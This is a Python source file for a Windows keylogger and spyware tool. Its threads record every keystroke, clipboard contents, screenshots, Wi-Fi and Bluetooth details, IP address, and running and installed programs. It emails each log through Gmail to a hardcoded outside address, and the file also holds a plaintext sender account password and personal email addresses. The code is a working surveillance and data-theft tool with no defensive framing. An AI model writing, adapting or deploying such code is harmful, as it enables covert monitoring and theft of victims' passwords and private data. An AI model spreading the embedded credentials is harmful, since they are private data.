import keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from email.mime.multipart import MIMEMultipart
import os
import time
import pyperclip
from PIL import ImageGrab
import psutil
import subprocess
import socket

# Global Variables
clipboard_text = ""
FILES_DIR = "Files"
KEYBOARD_LOG = os.path.join(FILES_DIR, "KeyBoard_Monitor.txt")
SCREENSHOT_FILE = os.path.join(FILES_DIR, "User_Screenshot.png")
SYSTEM_LOG = os.path.join(FILES_DIR, "System_Monitor.txt")
INSTALLED_APPS_LOG = os.path.join(FILES_DIR, "Installed_Apps.txt")
RUNNING_APPS_LOG = os.path.join(FILES_DIR, "Running_Apps.txt")
WIFI_BLUETOOTH_LOG = os.path.join(FILES_DIR, "WiFi_Bluetooth_Status.txt")
IP_LOG = os.path.join(FILES_DIR, "IP_Log.txt")

SENDER_EMAIL = "bytessquad2024@gmail.com"
SENDER_PASSWORD = "lzvi hnmt caxz ixsu"
RECEIVER_EMAIL = "jishnujitshama@gmail.com"

# Ensure the directory exists
os.makedirs(FILES_DIR, exist_ok=True)
for file_path in [KEYBOARD_LOG, SYSTEM_LOG, INSTALLED_APPS_LOG, RUNNING_APPS_LOG, WIFI_BLUETOOTH_LOG, IP_LOG]:
    with open(file_path, 'w') as f:
        f.write("")

# Email Function
def send_email(subject, body, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, 'rb') as file:
                attachment = MIMEBase('application', 'octet-stream')
                attachment.set_payload(file.read())
                encoders.encode_base64(attachment)
                attachment.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
                msg.attach(attachment)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        print(f"Email sent successfully: {subject}")
    except Exception as e:
        print(f"Error sending email: {e}")

# Monitor Wi-Fi and Bluetooth
def monitor_wifi_bluetooth():
    """
    Logs and monitors Wi-Fi and Bluetooth status.
    """
    while True:
        try:
            wifi_status = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
            bluetooth_status = subprocess.check_output("PowerShell Get-PnpDevice -Class Bluetooth", shell=True, text=True)
            with open(WIFI_BLUETOOTH_LOG, 'w') as file:
                file.write(f"--- Wi-Fi Status ---\n{wifi_status}\n")
                file.write(f"--- Bluetooth Devices ---\n{bluetooth_status}\n")
            send_email("Wi-Fi and Bluetooth Status", "Attached are the Wi-Fi and Bluetooth details.", WIFI_BLUETOOTH_LOG)
        except Exception as e:
            print(f"Error monitoring Wi-Fi and Bluetooth: {e}")
        time.sleep(3600)  # Log every hour

# Monitor IP Address
def monitor_ip_address():
    """
    Logs and monitors IP address changes.
    """
    last_ip = ""
    while True:
        try:
            current_ip = socket.gethostbyname(socket.gethostname())
            if current_ip != last_ip:
                last_ip = current_ip
                with open(IP_LOG, 'a') as file:
                    file.write(f"{time.ctime()}: {current_ip}\n")
                send_email("IP Address Changed", f"New IP Address: {current_ip}")
        except Exception as e:
            print(f"Error monitoring IP address: {e}")
        time.sleep(60)

# Monitor Running Applications
def monitor_running_apps():
    """
    Logs currently running applications to a file.
    """
    while True:
        try:
            running_apps = [p.info['name'] for p in psutil.process_iter(['name']) if p.info['name']]
            with open(RUNNING_APPS_LOG, 'w') as file:
                file.writelines("\n".join(running_apps))
            send_email("Running Applications Report", "Attached is the list of currently running applications.", RUNNING_APPS_LOG)
        except Exception as e:
            print(f"Error monitoring running applications: {e}")
        time.sleep(600)  # Log every 10 minutes

# Monitor Installed Applications
def monitor_installed_apps():
    """
    Logs installed applications to a file and emails the log daily.
    """
    last_apps = ""
    while True:
        try:
            cmd = 'wmic product get name,version'
            result = subprocess.check_output(cmd, shell=True, text=True)
            if result != last_apps:
                with open(INSTALLED_APPS_LOG, 'w') as file:
                    file.write(result)
                send_email("Installed Applications Report", "Attached is the list of installed applications.", INSTALLED_APPS_LOG)
                last_apps = result
        except Exception as e:
            print(f"Error monitoring installed applications: {e}")
        time.sleep(86400)  # Log daily

# Monitor Keyboard (Updated with Email Integration)
def monitor_keyboard():
    """
    Monitors keyboard events, logs key presses to a file, and sends an email with the log.
    """
    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                with open(KEYBOARD_LOG, 'a') as f:
                    f.writelines(f"{event.name}\n")
                # Send email when log file is updated
                send_email("Keyboard Activity Report", "Attached is the log of keyboard activity.", KEYBOARD_LOG)
    except Exception as e:
        print(f"Error monitoring keyboard: {e}")

# Monitor Clipboard (Updated with Email Integration)
def check_clipboard_for_text():
    """
    Checks for changes in the clipboard, logs text to a file, and sends an email with the log.
    """
    global clipboard_text
    while True:
        try:
            # Get current clipboard text
            current_clipboard_text = pyperclip.paste()
            if current_clipboard_text and current_clipboard_text != clipboard_text:
                clipboard_text = current_clipboard_text
                clipboard_log = os.path.join(FILES_DIR, "Clipboard_Monitor.txt")
                
                # Write to clipboard log
                with open(clipboard_log, 'a') as f:
                    f.write(f"{time.ctime()}: {clipboard_text}\n")
                
                # Send email with the clipboard log
                send_email("Clipboard Activity Report", "Attached is the log of clipboard activity.", clipboard_log)
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
        time.sleep(1)  # Check clipboard every second


# Combined Keyboard and Screenshot Monitor
def monitor_keyboard_and_screenshots():
    while True:
        try:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                with open(KEYBOARD_LOG, 'a') as f:
                    f.writelines(f"{event.name}\n")
                if event.name == "print screen":
                    capture_screenshot()
        except Exception as e:
            print(f"Keyboard monitoring error: {e}")

# Capture Screenshot
def capture_screenshot():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save(SCREENSHOT_FILE)
        send_email("Screenshot Captured", "Please find the screenshot attached.", SCREENSHOT_FILE)
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

# Start Threads
if __name__ == "__main__":
    threading.Thread(target=monitor_keyboard, daemon=True).start()
    threading.Thread(target=monitor_keyboard_and_screenshots, daemon=True).start()
    threading.Thread(target=check_clipboard_for_text, daemon=True).start()
    threading.Thread(target=monitor_wifi_bluetooth, daemon=True).start()
    threading.Thread(target=monitor_ip_address, daemon=True).start()
    threading.Thread(target=monitor_running_apps, daemon=True).start()
    threading.Thread(target=monitor_installed_apps, daemon=True).start()

    print("Monitoring started. Press Ctrl+C to stop.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Exiting program.")

